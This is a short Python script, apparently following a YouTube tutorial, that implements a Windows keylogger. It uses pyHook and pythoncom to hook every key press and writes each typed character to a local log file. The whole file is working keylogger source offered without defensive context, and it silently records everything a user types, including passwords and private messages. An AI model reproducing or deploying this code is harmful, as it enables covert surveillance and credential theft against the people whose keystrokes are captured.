#Creation of a simple python keylogger:
#https://www.youtube.com/watch?v=8BiOPBsXh0g
#using the modules Pyhook and pythoncom
import pyHook, pythoncom, sys, logging
file_log= "C:\\important\\log.txt"
def OnKeyboardEvent(event):
    logging.basicConfig(filename= file_log, level= logging.DEBUG, format= "%(message) s")
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager= pyHook.HookManager()
hooks_manager.KeyDown=OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
